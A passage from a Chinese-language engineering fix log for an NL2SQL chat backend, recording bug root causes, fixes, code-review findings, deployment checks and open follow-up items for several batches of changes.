- **测试**：全量 unit `2 failed / 2324 passed`（两条失败均为预存，delta=0）；
  `test_datasource_pool.py` + `test_nl2sql_service.py` 在**最终 hash** 上复跑 **206 passed**；
  集成切片 6 文件 **45 passed**；`ruff` 与 HEAD 同集合（delta=0）。
- ⚠️ 前置：全量 unit 跑完会把测试库 `ontology_class` 截空（既有 truncate 陷阱），
  集成前需 `DROP SCHEMA public CASCADE` + `DATABASE_URL=<test> alembic upgrade head` 恢复。

---

## 14. 修复记录：H6 + M6 + M3（2026-09-26）

批次范围：§2.2 **H6**（score 公式四处口径不一）、§2.3 **M6**（重复方法 + 同文件死代码）、
§2.3 **M3**（计划解析静默吞错 + 空计划旁路）。**§3 P1 第 8、9、12 项同时闭合。**

### 三条已定口径（用户决策，实现严格照此）

1. **M3 = 观测性 + 空计划判失败**（后者是**有意的行为变更**：全空计划由「静默直达 SQL 生成」改为走既有重试 → 用尽后「无法回答」）；
2. **H6 = 缺 `distance` 时保持 `KeyError` 快速失败**，**不**改 `.get(…, 0.0)`——`0.0` 会被换算成 `score = 1.0`（假完美命中）并静默污染排序；
3. **M6 = 只删「重复方法 + 同文件死代码」**，不顺手改行为。

### 根因与修法

| 项 | 根因 | 修法 | SSOT |
|---|---|---|---|
| H6 | 同一公式四处手抄，**已漂移出三种口径**：wiki 路径无 `round(,4)`，rag 路径既无 `max(0)` 也无 `round` ⇒ 负距离产出 `score > 1`（前端直接渲染百分比） | 新增单源纯函数 `app/services/vector_similarity.py::distanceToSimilarity`，四处调用点复用；私有 `_distanceToSimilarity` 删除；**源码级守卫**禁止再出现内联 `"1.0 / (1.0 +"` | [`refactor-score-ssot`](../changes/refactor-score-ssot/summary.md) |
| M6 | `ChartService._buildOptionPrompt` 定义两遍（`:121`/`:226`，同装饰器同签名同函数体），Python 对**类体重复方法零告警**，后者静默覆盖前者 | 删掉被覆盖的那份 + 同文件 2 处 F401、零调用 `_inferColumnType`、I001；**新增常驻 AST 守卫** `test_no_duplicate_methods.py` 扫 `app/` 全树 | [`chore-chart-service-deadcode`](../changes/chore-chart-service-deadcode/summary.md) |
| M3 | `QueryPlan.from_dict` 11 个静默丢弃点；`_parsePlanFromResponse` 4 条 `return None` 只有 1 条写日志；**且返回非 `None` 的「全空计划」既不入重试也不写日志**，直接进 `generateSql`（空计划无引用可校验 ⇒ 能过 `validatePlan`） | `from_dictWithReport(payload) -> (QueryPlan, tuple[PlanDrop, ...])`（`from_dict` 改为纯委托，语义逐字节不变）；`PlanDrop` 只存 `field/reason/rawType/count`（**不存原始值**，避免把模型输出带进日志）；出口按 `reason=` 单点聚合失败率；全空计划判失败入重试 | [`fix-plan-drop-observability`](../changes/fix-plan-drop-observability/summary.md) |

### 审查（code-reviewer + security-reviewer 独立送审）

两位审查**独立命中同一条**：半空计划（`{"rowLimit": 100}` / `{"conditions": [...]}` / 仅 `target` 非空）
在 M3 之后仍可直达 `generateSql`。当场处置 4 项 + 记 1 项：

| # | 审查发现 | 处置 |
|---|---|---|
| 1 | equivalence 测试**恒真**（拿 `from_dict` 当基准比对，而它现在**就是** `from_dictWithReport(data)[0]` 的纯委托） | 换成用 **M3 之前的实现**（`aefabd3`，分离 worktree 实测取得）机械生成的**黄金快照**（`dataclasses.astuple`，24 例带内联注释），并附复现配方 |
| 2 | `PLAN_EMPTY` 走失败分支时**丢弃详情**（只记 reason，`drops` 丢失） | 失败分支补 `drops=` 聚合，新增测试锁定「恰一条 `reason=PLAN_EMPTY` 且含 `target:PLAN_TARGET_NOT_STR(int)`」 |
| 3 | `nan` / `±inf` 穿透 `[0,1]` 值域（`max(nan, 0.0)` 返回 `nan`；`-inf` 被算成 `1.0` = 假完美命中） | 入口 `if not math.isfinite(value): return 0.0`（取「最不相似」，不猜值也不中断检索），RED/GREEN 各留证 |
| 4 | AST 守卫**漏检** `match` case 体内的同名方法、**误报** `@overload` + 实现的合法形态 | 改为按**重定义角色**判定（`overload`/`getter`/`setter`/`deleter`）+ 下钻 `stmt.cases[*].body`；并配「两个 `@property` + 一个实现仍照报」的**反放宽**用例 |
| 5 | 半空计划可直达 SQL 生成（两位审查各自命中） | **未在本批强改**（口径变更，会推翻既有「target 非空即合法」的用例）⇒ 转提案 [`2026-09-26-plan-scope-gate-proposal.md`](../changes/2026-09-26-plan-scope-gate-proposal.md) |

**教训两条**（已入 memory）：
①**「等价性」测试若拿被测对象自己当基准就是恒真** —— 必须用**实现之前的版本**机械生成快照，
并做**变异探针**证明新断言真的会红；②**Python 允许类体重复方法静默覆盖**，
这类腐化读码读不出来，只能靠常驻 AST 守卫拦。

### 部署验证（2026-09-26）

- **镜像重建**（非 `docker cp`）：`docker compose build backend && docker compose up -d backend`；
- **镜像级证据**（排除「容器里是 cp 残留」这一可能）：用镜像 `sha256:b6694892e89e…` 起一次性容器 ⇒
  `app/services/vector_similarity.py`、`app/domain/plan_drop.py` **在镜像内存在**，
  `grep -c "def _buildOptionPrompt" app/services/chart_service.py` = **1**，
  `app/domain/query_plan.py` md5 `6225dfff3d96c6cb8f9f41640d755936` 与仓库**一致**；
- 仓库 ↔ 容器 12 个文件 **12/12 MATCH**；容器内真机探针 **21 项全 PASS**（H6 值域/非有限/四调用点单源、M6 唯一性、M3 边界与报告）；
- 网关：`8000` 直连与经 nginx `5173` 的 `/api/v1/health` **均 200**；
- **测试**：全量 unit（最终 hash `3309a71`）**`2 failed, 2411 passed, 1 skipped`**，两条失败与 §13 记录**同名同因**（预存）⇒ delta=0；
  集成切片 **94 例 `2 failed / 92 passed`**；`ruff` 与基线同集合 **46 → 42（净 -4）**，新增 5 文件全通过。
- **对两条集成失败的判别实验（不靠推测）**：把用例跑在**本批之前**的 `7a8ce7d`（分离 worktree，实测该版本仍含 `_distanceToSimilarity` ⇒ 确为旧代码）上——**旧代码同样失败**，`assert 5 == 1`，
  且计数按**每跑一次 +1** 单调增长（3 → 4 → 5）、每次生成新的自增 id ⇒ 属
  **残留累积 + Milvus 删除可见性滞后 + 用例不自清理**（本批只改 score 数值口径、不写 Milvus），**非本批回归**。
  ⚠️ 这条要如实标注为**既有缺陷**（不是「flaky 所以忽略」）：用例用固定业务 id 写入、删除不可见即不自清理，
  跑够次数后必然失败，值得单独修（当前挂账，不在本批范围）。
- ⚠️ 顺序：全量 unit 会 truncate 测试库 ⇒ **先集成切片、再全量 unit**；恢复需 `DROP SCHEMA public CASCADE` + `DATABASE_URL=<test>` alembic upgrade head。

### 残差

1. **半空计划闸门**（见上表 #5）⇒ 提案文件，未排期；
2. `logger.warning(…, exc)` 不截断（§13 残差第 3 条，LOW）仍挂账；
3. Milvus 两个 round-trip 用例的自清理缺陷（本批实测出，见上）。

---

## 15. 修复记录：H4 + M4 + M5/M8 + H7 + M9 + M10（2026-09-27）

本批**一次做完评估剩余的全部 7 项**（用户指定范围）：§2.2 **H4**（断连落库）、**H7**（嵌入
provider 守卫）、§2.3 **M4**（同模型瞬态重试）、**M5**（L3 死代码）、**M8**（`prior_cte` 契约）、
**M9**（Milvus 全量读）、**M10**（KPI 缓存）。**§3 P1 第 7 项、P2 第 11 项、P3 第 16–18 项同时
闭合或改判**（见 §3 各项内的说明）。

### 四条已定口径（用户决策，实现严格照此）

1. **M5 边界 = 删引擎、保能力**：删 `_executeChainedSteps` / `_executeSingleChainedStep` + 其测试，
   **保留** `prior_cte` 能力并按「契约 = WITH-less 片段」修（即 M8 的修法）；
2. **H4 语义 = 落「已产出的部分答案」+ 标记中断**（新增 `session_message.interrupted`）；
3. **M4 接缝 = 放在 `generateQueryPlan` / `generateSql` 各自现有的 `for attempt` 循环内**；
4. **H7 深度 = 守卫 + 未知类型 fail-fast，不发明无法验证的协议**。

### 三项准入前压测结论（推翻/更正了评估原文）

| # | 评估原文的说法 | 压测实测 |
|---|---|---|
| 1 | H4「捕获 `CancelledError`，落库后再退出」 | **抓不到主情形**：断连时生成器多数**停在 `yield` 上**，取消根本**不进生成器帧** ⇒ `except CancelledError` 与 `finally` **都不触发**；且 anyio 取消是**电平触发**，`await asyncio.shield(...)` 必立刻抛（shield 保护内层任务，不是你 await 它的能力）⇒ 改落在 `StreamingResponse(background=…)` |
| 2 | M8「`_assert_read_only` 会拒绝无 `WITH` 形式」 | **因果方向是反的**：实际是**放过重复 `WITH`** —— `render_prior_cte` 自带前导 `WITH`、`generateSql` 又拼一次 ⇒ `WITH WITH …`；`_assert_read_only` 只看首个 token（`WITH` 在白名单）故放行 → 库侧语法错 → 被宽 `except Exception` 吞成 `success=False` |
| 3 | M10「随目录增长退化，换倒排索引」 | **前提不成立**：真实目录 13 KPI / 约 50 关键词，线性扫描亚毫秒 ⇒ 无可测收益；索引反而引入两处**静默偏离**（`""` 语义、写路径不重建）+ 500×30 字 **+42.3 MB** ⇒ **改判**为差分属性测试 |

另有两处**比评估原文更严重**的发现，本批一并处置：**M4 的计量盲区**（瞬态异常裸逃逸时，
前几轮**已累加**的 token 被静默丢弃 —— 第 1 轮成功 3000/500 + 第 2 轮抛出 ⇒ 3500 凭空消失）；
**M9 的破坏力被低估**（截断结果驱动 `--cleanup` 的**删集重建** ⇒ 窗口外向量永久丢失；
驱动对账 ⇒ 永不收敛）。

### 根因与修法

| 项 | 根因 | 修法 | SSOT |
|---|---|---|---|
| H4 | `_storeSessionMessages` 只在流尾执行；断连走「生成器不在任务栈上」的路径，**任何 `except`/`finally` 都抓不到** | `StreamPersistState` 每请求持有器（挂 `session.info`，状态变化处**就地赋值**）+ **单发标志**（成功落库后置位）；SSE 路由改 `StreamingResponse(background=BackgroundTask(persistIfInterrupted))`（在收敛任务组**之外**被 await，断连时确定跑到，且此时请求 session 仍开着）；新迁移 `0085_session_message_interrupted`（`interrupted BOOLEAN NOT NULL DEFAULT false`，历史行天然 false；`_storeSessionMessages` 以**关键字专用参数**扩展 ⇒ 27 个调用点零改动） | [`fix-chat-disconnect-persistence`](../changes/fix-chat-disconnect-persistence/summary.md) |
| M4 | 瞬态异常从 `for attempt` 循环**裸逃逸**，已累加用量无人取用；判定逻辑散落在 `chat_service` 内 | 抽叶子模块 `app/services/llm_retry_policy.py`（**不得 import `chat_service`**，否则经 `nl2sql_service` 成环；AST 探针验证 imports 集合）；两个方法接 `_completeWithTransientRetry(…, allowRetry=attempt == 0)`，**逃逸前把已累加用量挂到异常上**；既有契约（`_callWithRetryBackoff` 重试**任何** `LlmClientError`，由调用方过滤）**原样保持** | [`fix-llm-transient-retry`](../changes/fix-llm-transient-retry/summary.md) |
| M5 | L3 CTE 引擎无生产接线，且含**未计量** LLM 调用 | 删引擎两函数 + 段注释 + 三处导入 + 整份 `test_l3_chained_steps.py`；**保留** `_summarizeStepData`（活代码）与 `chained_step_plan.py`（`render_prior_cte` 留作纯函数工具）。⚠️ 如实标注：删除后 `prior_cte` 形参**也无生产调用者**（唯一调用方就是被删的引擎）⇒ 保留的是**能力**而非**层**，由 `test_prior_cte_contract.py` 钉死契约（见 §15 残差第 1 条） | [`chore-l3-deadcode-and-prior-cte-contract`](../changes/chore-l3-deadcode-and-prior-cte-contract/summary.md) |
| M8 | 契约自相矛盾 ⇒ `WITH WITH` 地雷，且守卫**放行**（首 token 白名单） | WITH-less 成为**唯一**合法形态：`render_prior_cte` 去掉前导 `WITH`；入口 `_assertPriorCteSafe` **显式拒绝**带 `WITH` 的入参（可操作消息）；docstring 二义表述删除；新增守卫测试（拼装后**恰好一个**前导 `WITH` + `not "WITH WITH"`） | 同上 |
| H7 | `provider_type` 是**死元数据**；维度守卫只覆盖 DB 路径，env 回退分支**在守卫之前 `return`** | `KNOWN_PROVIDER_TYPES`（取**前端枚举**为源）→ 未知/空值 `ConfigError`；`_assertDimensionMatches(*, name, declaredDimension, source)` 提为两条路径共用；env 未声明时 `logger.warning`（**不猜测**模型维度 —— 猜错会拦下正确部署） | [`fix-embedding-provider-type-guard`](../changes/fix-embedding-provider-type-guard/summary.md) |
| M9 | `query(limit=16384)` 超限**静默截断**，两个消费者都把它当「全量」 | `_queryAllRows` 走 `Collection.query_iterator`（`close()` 在 `finally`，累计行数**恰为批大小整数倍**时 warning 留痕）；常量收敛 `_MILVUS_QUERY_PAGE`；**可注入 `iteratorFactory`** 让单测不依赖真 Milvus | [`fix-milvus-list-all-pagination`](../changes/fix-milvus-list-all-pagination/summary.md) |
| M10 | **改判**（见上）：真缺口是「真实实现的候选顺序**零覆盖**」 | 对**真实** `KpiMatchCache` 建**差分**校验（测试侧朴素实现独立复算匹配规则 + 顺序规则再逐条比对，**不是**把缓存输出抄成期望值）；钉死两条现状语义（`[""]` 命中全部、`refreshOne` 尾移怪癖）；**零生产代码改动** | [`test-kpi-match-cache-ordering`](../changes/test-kpi-match-cache-ordering/summary.md) |

### H4 的诚实边界（写进 SSOT，不作为验收项）

- **不做 token 回填**：答复 token 只在 `isDone` 终块上有（非终块由 `openai_client` 发
  `promptTokens=0, completionTokens=0`）⇒ 断连时刻**部分答案的 token 数根本不存在**，
  「补记」等于编数。中断轮的用量按**未知**处理（成本是**诚实的下界**），不伪造 0；
- **明确不保证**：进程被杀/容器停止**中途**的写入；客户端「中断后立刻重试」与后台写入的**竞态**
  —— 幂等性**不得**建立在「取消时的写入一定已落库」之上。

### 验证（全部可复现，2026-09-27）

- **真机断连验证（H4 唯一不能只靠单测的一项）**：真实 SSE 请求中途断连 ⇒ 库中该轮 user +
  assistant 行存在、`interrupted = true`、`query_state` 已写；**对照正常跑完的一轮**：
  `interrupted = false` 且**无重复行**（单发标志生效）。迁移时回填 636 行，现共 640 行、
  1 行为 `interrupted`；
- **容器内真机探针**（跑在**部署物**上，非本地）：综合 `probe_batch.py` **28/28**（含 H4 段与
  H7 的 9 项）、`probe_m4.py` **12/12**（含「逃逸异常必须带 3000/500 而非 0/0」）、
  `probe_m9_diff.py` **4/4**（`listAllEmbeddings` vs `batch_size=7` 两条独立路径**逐行等集等序**）、
  `probe_m10.py` **15/15**；
- **测试**：全量 unit + services **`2 failed, 2522 passed, 1 skipped`**（两条为**预存**失败，
  用 `git worktree add --detach` 在基线复现判别 ⇒ **delta = 0**）；集成切片 **120 passed** +
  3 例环境耦合（导出 `DATABASE_URL` 后 3/3 通过）；前端 **58 passed** + 新 bundle `index-suiR3M4D.js`；
- **静态检查**：本批 22 文件 ruff **与基线逐行一致**（唯一 F841 为**基线既有**，未顺手修）；
- **部署一致性**：`./scripts/deploy_backend.sh`（含 `alembic/`）⇒ 仓库 ↔ 容器 md5
  **22/22 现存文件 MATCH**，1 处 DIFF 是**有意删除**的 `test_l3_chained_steps.py`；
  网关 `8000` 直连与经 nginx `5173` 的 `/api/v1/health` **均 200**。
- ⚠️ 顺序：**先集成切片、再全量 unit**（全量会 truncate 测试库）。

### 探针自身的缺陷（同一根因踩了三次，记入教训）

三个探针首跑各有 FAIL，**全部是断言缺陷而非产品缺陷**，且根因同一个：
**「文档提到旧写法」≠「代码还在用旧写法」** —— 对源文件做**子串计数**会把
**注释/docstring 里对被删模式的说明**判成违规（M4 命中新模块 docstring 里自己写的禁令；
M9 先命中兄弟函数的合法 `limit=`，再命中函数体内**正在解释这条改动**的 docstring）。
修法一律改对**代码骨架**断言（AST 取函数体 + `tokenize` 剥离 STRING/COMMENT）。
另有一处是**数据不符**：M10 探针假设「prod 目录有关键词」，而实际 `semantic_keywords` **全为 NULL**
⇒ 改为数据感知断言并显式标注「本项在 prod 数据上不可判」。**三处 FAIL 的原始输出都留在各自 SSOT 里**。

### 残差与后续（§15 主批新登记，**不在主批做**；第 3/4/5 条已由 §15 第四拨关闭）

> ⚠️ 第 3/4/5 条原是 §15 主批的「残差与后续」清单中的「后续观察项」，已由 2026-09-27
> **§15 第四拨**（[`chore-chat-15-tail-three-items`](../changes/chore-chat-15-tail-three-items/summary.md)）
> 全部关闭并各自 SSOT 化（见各条 ✅ 标记）。第 2 条由 2026-09-27 部署补做关闭（见该条 ⚠️ 注）。
> 第 1/7/8 条仍为残差。

1. **`prior_cte` 能力当前无生产调用者**（M5 的直接后果）：`render_prior_cte` 与 `generateSql(prior_cte=…)`
   只被契约测试驱动。保留是**用户口径**（删引擎、保能力），但**若长期不接线**，应连同
   `app/domain/chained_step_plan.py` 一并评估删除 —— 否则等于把 M5 删掉的死代码换了个位置留着；
2. ✅ **L3 展示漂移**（§2.5 新行，已关闭 2026-09-27）：代码修复见 `ac94416`
   （[`fix-routing-metrics-l3-truth`](../changes/fix-routing-metrics-l3-truth/summary.md)）。
   ⚠️ **部署补做**：该 SSOT §8 的部署验证段写入时**并未实际执行**（镜像停留在 2026-09-26 16:19、
   旧 bundle 仍含 L3 文案，容器白跑了 ~18 小时）；2026-09-27 实际执行
   `docker compose build --no-cache --build-arg NPM_REGISTRY=https://registry.npmmirror.com frontend`
   + `up -d frontend` 后才真正生效——新 bundle `index-CrZz1sMZ.js`：旧 L3 字符串 0 命中、
   新 L2 文案 1 命中、nginx 与 API health 均 200；
3. ✅ **KPI 关键词索引**（2026-09-27 第 3 项，已 SSOT 化）：`KpiMatchCache` 类 docstring
   登记未来 Aho-Corasick / 后缀自动机的**准入压测数据**（500 关键词 × 30 字字典实测
   +42.3MB 纯开销）+ 「千级才需要 + 写路径同生命周期」硬约束，**当前实现保留作 SSOT**
   —— 见 [`chore-chat-15-tail-three-items`](../changes/chore-chat-15-tail-three-items/summary.md) §5.1；
4. ✅ **空关键词语义**（2026-09-27 第 2 项，已修）：`findByAnyKeyword` 加 `if not kw: continue`
   防御（`"" in s` 恒真的 substring 副作用 → no-op）；既有合法调用路径 `_extractKeywords`
   不产 `[""]`，本批为防御性 —— 见 [`chore-chat-15-tail-three-items`](../changes/chore-chat-15-tail-three-items/summary.md) §5.2；
5. ✅ **失败尝试的 LLM 用量采集**（2026-09-27 第 1 项，已落地）：`LlmClientError` 扩
   `tokens: tuple[int, int] | None` 字段；`completeStream` 累计挂上终块 usage（异常时
   携带 `(1500, 200)` 等真实数字）；`complete_with_tools` 后处理失败挂上响应 usage；
   `consumedTokens` 第二档优先级 `LlmClientError.tokens > retryGenTokens`；顺手修
   `openai_client` ↔ `factory` 潜在 circular import（直导 `concurrency` 叶子模块）
   —— 见 [`chore-chat-15-tail-three-items`](../changes/chore-chat-15-tail-three-items/summary.md) §5.3；
6. ✅ **H7 残留**（2026-09-27 补关）：`docker/.env` + `backend/.env` 实际写入 `EMBEDDING_DIMENSION=1024`；env 回退路径维度守卫现**生效**——3 探针验证：active 路径返回 `bge-m3-mlx-8bit`、env fallback 1024 通过、env fallback 768 抛 ConfigError（见 §2.3 H7 状态列）；
7. **M9 残留**：仍用 ORM 风格 `Collection` API（pymilvus 3.x 已标 deprecated），迁
   `MilvusClient.query_iterator` 属独立改动；
8. 本批之外仍挂账：§2.4 LOW 全部、§2.5 其余漂移（**`config.py` 重复字段定义**）、
   P2 第 13/14 项（拆大文件、魔数治理）、M1 半空计划闸门提案、库侧只读兜底提案、
   `logger.warning(…, exc)` 截断、Milvus 两个 round-trip 用例的残留累积（§14 残差第 3 条）。
